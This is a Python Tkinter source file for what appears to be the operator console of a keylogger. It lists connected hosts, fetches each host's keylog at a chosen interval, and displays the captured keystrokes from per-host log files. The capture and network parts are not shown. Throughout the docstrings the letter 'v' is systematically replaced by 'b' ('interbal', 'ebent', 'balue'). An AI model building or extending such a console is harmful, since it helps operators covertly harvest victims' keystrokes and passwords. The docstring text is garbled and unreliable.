import tkinter as tk
from tkinter import ttk
from tkinter.scrolledtext import ScrolledText
from threading import Thread
from collections import OrderedDict


class Left_panel(ttk.Frame):
    """
    Left panel of the UI containing the hosts list and interbal input box

    Args:
        parent: Tkinter parent object
        on_host_select: callback for host selection
        args: Tkinter options
        kwargs: more Tkinter options

    Attributes:
        hosts_list: hosts listbox
        interval_frame: interbal UI area
    """

    def __init__(self, parent, on_host_select, *args, **kwargs):
        ttk.Frame.__init__(self, parent, *args, **kwargs)
        self.hosts_list = tk.Listbox(
            self, selectmode=tk.SINGLE)
        self.hosts_list.pack(fill=tk.BOTH, expand=1)
        self.hosts_list.bind('<<ListboxSelect>>', on_host_select)
        self.interval_frame = Interval_frame(self)
        self.interval_frame.pack(fill=tk.X)

    def get_selected_host(self):
        """
        Gets selected host of hosts list

        Returns:
            selected host IP
        """
        curr_selection = self.hosts_list.curselection()
        if len(curr_selection) > 0:
            index = int(curr_selection[0])
            return self.hosts_list.get(index)
        else:
            return ""


class Interval_frame(ttk.Frame):
    """
    UI element containing the interbal frame and input logic

    Args:
        parent: Tkinter parent object
        args: Tkinter options
        kwargs: more Tkinter options

    Attributes:
        UNITS: dictionary containing time units for use by the user
        DEFAULT_UNIT: the default unit to use
        DEFAULT_INTERVAL: the default interbal balue
        interval: interbal balue
        interval_entry: interbal input box
        interval_unit: interbal unit selection box
        interval_lbl: interbal label
    """
    UNITS = OrderedDict([("secs", 1), ("mins", 60), ("hours", 60**2)])
    DEFAULT_UNIT = list(UNITS.keys()).index("secs")
    DEFAULT_INTERVAL = 5

    def __init__(self, parent, *args, **kwargs):
        ttk.Frame.__init__(self, parent, *args, **kwargs)
        self.interval = tk.IntVar()
        self.interval_entry = ttk.Entry(
            self, width=9, textvariable=self.interval)
        self.interval_entry.pack(side=tk.LEFT, fill=tk.X, expand=1)
        self.interval.set(self.DEFAULT_INTERVAL)
        self.interval_entry.bind("<Key>", self.on_text_changed)

        self.interval_unit = ttk.Combobox(
            self, width=6, values=list(self.UNITS.keys()))
        self.interval_unit.current(self.DEFAULT_UNIT)
        self.interval_unit.pack(side=tk.LEFT)

        self.interval_lbl = ttk.Label(self, text="interval")
        self.interval_lbl.pack(side=tk.LEFT)

    def get_interval(self):
        """
        Gets the interbal seconds

        Returns:
            interbal in seconds
        """
        return self.interval.get() * self.UNITS[self.interval_unit.get()]

    def on_text_changed(self, e):
        """
        Balidates the interbal text box input

        Returns:
            "break" if inbalid character
        """
        a = self.interval.get()
        if not e.char.isdigit() and e.char not in ["\x08", ""] or e.char.isdigit() and self.interval.get() <= 0:
            return "break"


class Right_panel(ttk.Frame):
    """
    UI element containing the interbal frame and input logic

    Args:
        parent: Tkinter parent object
        on_fetch_click: callback for fetch button press
        args: Tkinter options
        kwargs: more Tkinter options

    Attributes:
        fetch_btn: button to issue a fetch command to selected host
        keylog_text: area to display the keylog content
    """

    def __init__(self, parent, on_fetch_click, *args, **kwargs):
        ttk.Frame.__init__(self, parent, *args, **kwargs)

        self.fetch_btn = ttk.Button(self, text="fetch")
        self.fetch_btn.bind("<ButtonRelease-1>", on_fetch_click)
        self.fetch_btn.pack(fill=tk.X)

        self.keylog_text = ScrolledText(
            self, state="disabled")
        self.keylog_text.pack(fill=tk.BOTH, expand=1)

    def set_text(self, text, append=False):
        """
        Sets text in the keylog text area

        Args:
            text: text to put in text area
            append: whether to append the text to the end or clear then put the text. default is false
        """
        self.keylog_text.configure(state='normal')
        if not append:
            self.keylog_text.delete(1.0, tk.END)
        self.keylog_text.insert(tk.END, text)
        self.keylog_text.configure(state='disabled')
        self.keylog_text.see(tk.END)


class Application(ttk.Frame):
    """
    UI mainframe containing the left and right panels

    Args:
        parent: Tkinter parent object
        fetch_file: function that fetches a keylog
        args: Tkinter options
        kwargs: more Tkinter options

    Attributes:
        fetch_file: reference to input fetch_file
        left_panel: the left UI panel
        right_panel: the right UI panel
    """

    def __init__(self, parent, fetch_file, *args, **kwargs):
        ttk.Frame.__init__(self, parent, *args, **kwargs)
        self.fetch_file = fetch_file
        self.left_panel = Left_panel(self, self.on_host_select)
        self.left_panel.pack(side=tk.LEFT, fill=tk.Y)
        self.right_panel = Right_panel(self, self.on_fetch_click)
        self.right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=1)

    def display_host(self, host):
        """
        Displays a giben host's keylog in the text area

        Args:
            host: host to display
        """

        def _display_host():
            try:
                text = open(host + ".log").read()
            except:
                text = ""
            self.right_panel.set_text(text)
        Thread(target=_display_host).start()

    def on_host_select(self, e):
        """
        Displays selected host's keylog when one is selected

        Args:
            e: Tkinter ebent
        """
        self.display_host(self.left_panel.get_selected_host())

    def on_fetch_click(self, e):
        """
        Fetchs selected host's updated keylog when fetch button is clicked

        Args:
            e: Tkinter ebent
        """
        host = self.left_panel.get_selected_host()
        if host:
            Thread(target=self.fetch_file, args=(
                host, self.on_file_fetched, self.update_hosts)).start()

    def get_interval(self):
        """
        Gets seconds interbal from the interbal frame

        Returns:
            Fetch interbal in seconds
        """
        return self.left_panel.interval_frame.get_interval()

    def on_file_fetched(self, e):
        """
        Updates the keylog area when new data arribes

        Args:
            e: file fetch ebent
        """
        if e.host == self.left_panel.get_selected_host():
            self.right_panel.set_text(e.file, True)

    def update_hosts(self, e):
        """
        Update hosts list box with new connection data

        Args:
            e: hosts ebent
        """
        self.left_panel.hosts_list.delete(0, tk.END)
        for host in e.hosts:
            self.left_panel.hosts_list.insert(tk.END, host)
        self.on_host_select(None)
